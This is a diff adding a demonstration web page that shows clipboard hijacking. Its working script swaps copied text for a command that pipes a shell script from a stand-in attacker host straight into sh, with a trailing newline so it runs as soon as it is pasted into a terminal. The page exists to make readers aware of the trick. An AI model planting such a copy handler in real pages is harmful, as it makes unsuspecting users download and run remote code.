@@ -1,0 +1,38 @@
+<html>
+    <head>
+        <title>Clipboard abuse</title>
+        <style>
+            .terminal {
+                background-color: #000000;
+                color: #E0E0E0;
+                font-family: monospace;
+                padding: 1rem 0.75rem;
+                width: 80%;
+                border-radius: 4px;
+            }
+            p > div
+        </style>
+        <script>
+            document.addEventListener('copy', function(e) {
+                e.clipboardData.setData('text/plain', 'curl http://evil.example.com/shell.sh | sh\n');
+                e.preventDefault();
+            });
+        </script>
+    </head>
+    <body>
+        <h1>Clipboard abuse on copy</h1>
+        <h2>Synopsis</h2>
+        <p>This is a small Proof of Concept on how websites can change the clipboard after you have copied something.</p>
+        <p>Some websites put a copyright notice in the clipboard after you (try to) copy some text off a webpage, but the same mechanism can be used in a much more nefarious way.</p>
+        <h2>Show and tell</h2>
+        <p style="margin-bottom: 0.5rem">Try to copy some text from this web page, for example the following, innocent Linux shell command:</p>
+        <div class="terminal">sudo apt update</div>
+        <p>Done? Now paste your text in the text box below. There is nothing fancy happening while pasting in the text box (the magic happened when you copied some text to the clipboard); you can paste in an external application like a text editor as well.</p>
+        <textarea rows="10" cols="80" placeholder="Paste your text here"></textarea>
+        <p>Disturbing, isn't it?</p>
+        <h2>How it works</h2>
+        <p>There is a small amount of JavaScript loaded in this webpage that adds an event listener that fires when something is copied to the clipboard.</p>
+        <p>The event handler changes the text that is sent to the clipboard and prevents the default event handler from executing.<br>
+        Adding the <tt>\n</tt> at the end of the string that is put on the clipboard, makes it so that if you paste in a terminal, the command will automatically be executed, without any other user interaction required.</p>
+    </body>
+</html>
